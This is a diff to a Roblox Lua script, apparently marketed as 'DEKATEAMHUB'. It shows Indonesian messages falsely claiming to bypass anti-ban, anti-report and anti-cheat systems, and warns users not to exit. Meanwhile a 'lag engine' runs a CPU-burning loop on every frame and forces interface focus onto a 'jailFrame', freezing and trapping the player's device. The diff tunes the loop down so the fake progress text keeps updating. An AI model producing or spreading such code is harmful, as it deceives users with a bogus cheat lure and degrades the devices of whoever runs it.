@@ -62,31 +62,29 @@ task.spawn(function()
     infoText.BackgroundTransparency = 1
     infoText.Font = Enum.Font.Code
     
-    -- [[ FIX SISTEM UPDATE TEKS ]] --
+    -- [[ SISTEM UPDATE TEKS - PRIORITAS TINGGI ]] --
     task.spawn(function()
-        -- 1. Anti Banned
         infoText.Text = "DEKATEAMHUB: BYPASSING ANTI BANNED...\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
         task.wait(120)
         
-        -- 2. Anti Report
         infoText.Text = "DEKATEAMHUB: BYPASSING ANTI REPORT...\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
         task.wait(120)
         
-        -- 3. Anti Detected
         infoText.Text = "DEKATEAMHUB: BYPASSING ANTI DETECTED...\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
         task.wait(120)
         
-        -- 4. FINAL: Anti Cheat (1 Minggu)
         infoText.Text = "DEKATEAMHUB: BYPASSING ANTI CHEAT...\n\nDURASI: 1 MINGGU\nJANGAN KELUAR ATAU DEVICE ANDA ERROR!"
     end)
 
-    -- Lag Engine
+    -- Lag Engine (Disesuaikan agar teks tetap bisa update)
     game:GetService("RunService").RenderStepped:Connect(function()
         game:GetService("GuiService").SelectedObject = jailFrame
-        infoText.Position = UDim2.new(0.05, math.random(-2, 2), 0.3, math.random(-2, 2))
-        for i = 1, 1500000 do local _ = i * i end
+        infoText.Position = UDim2.new(0.05, math.random(-1, 1), 0.3, math.random(-1, 1))
+        -- Beban dikurangi dikit biar sistem sempet ganti teks
+        for i = 1, 500000 do local _ = i * i end
     end)
 end)
+
 
 
 
